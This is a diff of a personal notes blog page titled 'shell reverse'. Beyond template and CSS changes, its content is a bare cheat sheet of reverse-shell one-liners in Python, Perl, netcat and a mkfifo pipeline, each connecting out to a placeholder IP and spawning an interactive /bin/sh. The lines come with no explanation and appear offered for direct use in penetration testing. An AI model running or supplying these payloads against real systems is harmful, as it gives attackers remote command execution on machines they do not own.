@@ -1,29 +1,143 @@
-<!DOCTYPE html>
-<html>
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!doctype html>
+<html lang="en">
 
-        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  <meta name="generator" content="Hugo 0.52" />
 
-        <title>shell reverse</title>
+  
 
-        <link rel="stylesheet" href="/css/stylesheet.css">
-    </head>
-    <body>
-        <section id="page-title">
-            <h1><a href="/">Notes</a></h1>
-        </section>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="https://sosprz.github.io/apple-touch-icon.png">
+
+  
+  <link rel="icon" type="image/png" sizes="32x32" href="https://sosprz.github.io/favicon-32x32.png">
+
+  
+  <link rel="icon" type="image/png" sizes="16x16" href="https://sosprz.github.io/favicon-16x16.png">
+
+  
+  <link rel="manifest" href="https://sosprz.github.io/site.webmanifest">
+
+  
+  <link rel="mask-icon" href="https://sosprz.github.io/safari-pinned-tab.svg" color="">
+
+  <meta name="msapplication-TileColor" content="">
+
+  <meta name="theme-color" content="">
+
+  
+  <link rel="stylesheet" href="https://sosprz.github.io/css/bootstrap.min.css" />
+
+  
+  <title>shell reverse | </title>
+  
+
+  <style>
+body {
+  min-width: 300px;
+}
+
+.custom-navbar {
+  margin-bottom: 1em;
+  height: 60px;
+}
+
+.custom-navbar a {
+  display: inline-block; 
+  padding: 18px 0;
+  margin-right: 1em; 
+  font-weight: bold; 
+}
+
+.custom-navbar a:hover,
+.custom-navbar a:focus {
+  text-decoration: none; 
+}
+
+@media print {
+  .custom-navbar {
+    display: none;
+  }
+}
+
+article {
+  padding-bottom: 1em;
+}
+
+img {
+  max-width: 100%;
+}
+
+
+body {
+  background-color: #fff;
+}
 
 
 
-<section class="blog-post">
-    <h1>shell reverse</h1>
-    <div class="blog-post-subheader">
-        December 17, 2018
-    </div>
-    <div class="blog-post-content">
-        <p><code><pre>
+body {
+  color: #212529;
+}
+
+
+
+a {
+  color: #007bff;
+}
+
+
+
+a:hover,
+a:focus {
+  color: #0056b3;
+}
+
+
+
+.custom-navbar {
+  background-color: #212529;
+}
+
+
+
+.custom-navbar a {
+  color: rgba(255,255,255,.75);
+}
+
+
+
+.custom-navbar a:hover,
+.custom-navbar a:focus {
+  color: rgba(255,255,255,1);
+}
+
+
+
+.container {
+  max-width: 800px;
+}
+
+
+
+
+
+</style>
+</head>
+
+<body>
+  <nav class="custom-navbar">
+  <div class="container">
+    
+  </div>
+</nav>
+  
+  <div class="container">
+    <article>
+      <h1>shell reverse</h1>
+<p><code><pre>
 python3 -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.10.10&rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;<br />
 perl -e &lsquo;use Socket;$i=&ldquo;10.10.10.10&rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;<br />
 nc -e /bin/sh 10.0.0.1 1234<br />
@@ -47,8 +161,14 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | \n\c -6 -l 66
 nc -6 localhost 6677
 </pre></code></p>
 
-    </div>
-</section>
+    </article>
+  </div>
 
-    </body>
+  
+  
+  
+
+  
+</body>
+
 </html>
